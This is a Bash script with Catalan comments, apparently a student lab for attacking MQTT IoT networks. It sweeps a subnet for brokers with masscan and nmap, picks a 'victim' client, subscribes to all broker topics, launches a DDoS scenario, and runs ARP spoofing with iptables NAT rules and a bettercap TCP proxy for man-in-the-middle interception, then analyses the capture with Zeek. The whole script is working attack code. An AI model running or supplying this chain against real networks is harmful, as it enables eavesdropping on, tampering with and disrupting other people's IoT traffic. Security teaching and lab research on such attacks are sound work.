#!/bin/bash
flag_dos=false
flag_mitm=false
flag_inspect=false
flag_sniffing=false

net=192.168.0.0
mask=/24
gw=192.168.0.1
interface=wlp42s0
num_clients=2
compose_file="./CLIENTS_ENV/docker-compose-offline.yml"

#1- Captura de paquets amb tcpdump
#2- Masscan per trobar el broker
#3-Nmap -sn per trobar clients connectats
#4- Nmap nse-script per trobar info rellevant del broker
#5- Sniffing mosquitto_sub per trobar tòpics
#6- Despegament d'entorn simulat DDoS
#7- Arp spoof i MITM proxy
#8- Analisis de la captura pcap amb zeek per extreure conclusions

while getopts "mdis" opt; do
    case $opt in 
        m) flag_mitm=true ;;
        d) flag_dos=true ;;
        i) flag_inspect=true ;;
        s) flag_sniffing=true ;;
        \?) echo "opció invalida: -$OPTARG" >&2
            exit 1 ;;
    esac
done

cleanup() { #per apagar el docker amb Ctl+C
    echo -e "\n Tancant escenari: \n"
    sudo docker compose -f "$compose_file" down
    sudo docker stop escaner && sudo docker rm escaner
    sudo docker exec -it sniffer bash -c "kill -2 1"
    sudo docker stop sniffer && sudo docker rm sniffer
    sudo docker stop mitm && sudo docker rm mitm

    #8- Analisis de la captura pcap amb zeek per extreure conclusions
    echo -e "\n Analitzant paquets capturats \n"
    sudo docker run --rm --name analitzador --network host -v "$(pwd)/escaner":/home zeek/zeek bash -c "cd /home/zeek && zeek -r /home/zeek/capt.pcap"
    exit 0
}
trap cleanup SIGINT SIGTERM

mkdir -p ./escaner
sudo docker run -d --name escaner --network host -v "$(pwd)/escaner":/home ubuntu:latest sleep infinity #contenidor ubuntu mb interface del host
sudo docker exec escaner bash -c "apt update && apt install -y nmap masscan prips mosquitto-clients"

#1- Captura de paquets amb tcpdump
echo -e "\n captura de paquets \n"
sudo docker run -d --name sniffer --network host -v "$(pwd)/escaner/zeek":/home ubuntu:latest bash -c "apt update && apt install -y tcpdump && tcpdump -i $interface -w /home/capt.pcap" #Monitoreig xarxa tcpdump

#2- Masscan per trobar el broker
echo -e "\n    - Escaneig de xarxa per MQTT en el rang $net $mask : \n"
sudo docker exec escaner bash -c "cd /home && masscan $net$mask -p1883 --rate 1000 -oG masscan.txt" #masscan per trobar el broker via tcp port 1883
ip_broker=$(grep "Host: " ./escaner/masscan.txt | awk '{print $4}')
echo -e "\n IP Broker: $ip_broker \n"

#3- Nmap -sn per trobar clients connectats
echo -e "\n Trobant IPs clients MQTT \n" 
sudo docker exec escaner bash -c "cd /home && nmap -sn $net$mask -oG devices.txt"
grep "^Host:" "./escaner/devices.txt" | awk '{print $2}' | cut -d'(' -f1 > "ips.txt"
ip_victima=$(head -n 1 ips.txt)
echo -e "\n IP Victima: $ip_victima \n"


#4- Nmap nse-script per trobar info rellevant del broker
if [ "$flag_inspect" = true ]; then
    echo -e "\n    - Extreient informació del broker MQTT $ip_broker...\n"
    sudo docker exec escaner bash -c "cd /home && nmap -Pn --script mqtt-subscribe -p 1883 -oG info_broker.txt $ip_broker" #scipts info broker
    #afegir eines?
fi

#5- Sniffing mosquitto_sub per trobar tòpics
if [ "$flag_sniffing" = true ]; then
    echo -e "\n    - Subscribint-se temporalment al broker per capturar missatges: \n"
    sudo docker exec escaner bash -c "cd /home && timeout 5s mosquitto_sub -h $ip_broker -t '#' -v > mqtt_sub.txt" #escolta pasiva tòpics durant 5s
    read topic msg < <(awk '{print $1, $2}' ./escaner/mqtt_sub.txt)  #no cal printejar realment
    echo -e "\n    - Topic: $topic  Msg: $msg \n"
fi

#6- Despegament d'entorn simulat DoS
if [ "$flag_dos" = true ]; then
    sudo docker exec escaner bash -c "cd /home && source /home/ip_lliures.sh $net$mask $num_clients" #llista de clients conectats i ip lliures a la xarxa 
    source ./escaner/vars.env
    echo -e "\n IPs Clients simulates: \n   - CL1: $ip_cl1 \n   - CL2: $ip_cl2 \n"
    echo -e "\n    - Desplegant entorn simulat, executant analitzador i atac DDoS \n" 
    export ip_broker ip_cl1 ip_cl2 net gw interface mask #exportar variables per ser utilitzades en el docker compose (paràmetre -E)
    sudo -E docker compose -f "$compose_file" up -d  #Desplegament d'escenari
fi

#7- Arp spoof i MITM proxy
if [ "$flag_mitm" = true ]; then
    echo -e "\n executant arp spoofing \n"
    sudo docker run -d --name mitm  --privileged --network host -v "$(pwd)/escaner":/home kalitfg sleep infinity
    sudo docker exec -it mitm bash -c "sudo iptables -t nat -A PREROUTING -p tcp --dport 1883 -j REDIRECT && sudo iptables -t nat -A POSTROUTING -p tcp --dport 1883 -j SNAT --to-source $ip_victima" 
    sudo docker exec -it mitm bash -c "apt update && apt install -y bettercap && bettercap -iface wlp42s0 -eval \"set tcp.proxy.port 1883 ; set tcp.address '$ip_broker' ; set tcp.port 1883 ; tcp.proxy on ; set arp.spoof.internal true ; set arp.spoof.targets '$ip_victima', '$ip_broker' ; arp.spoof on\""
#sudo docker exec -it mitm bash -c "apt update && apt install -y bettercap && bettercap -iface wlp42s0 -eval \"set tcp.proxy.port 1883 ; set tcp.address '$ip_broker' ; set tcp.port 1883 ; tcp.proxy on ; set arp.spoof.fullduplex true ; set arp.spoof.targets '$ip_victima' ; arp.spoof on\""
fi    

while true; do #per apagar el docker amb Ctl+C
    sleep 1
done     
